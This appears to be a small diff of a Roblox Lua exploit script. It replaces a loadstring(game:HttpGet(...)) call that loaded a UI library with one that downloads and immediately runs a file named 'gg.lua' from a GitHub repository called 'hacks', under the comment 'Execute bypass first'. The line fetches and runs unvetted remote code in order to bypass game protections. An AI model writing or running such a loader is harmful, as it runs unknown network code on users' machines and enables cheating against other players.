@@ -1,6 +1,6 @@
 
 -- Execute bypass first
-loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/Library.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dinowaregg/hacks/refs/heads/main/gg.lua",true))()
 
 if (not game:IsLoaded()) then
      game.Loaded:Wait();
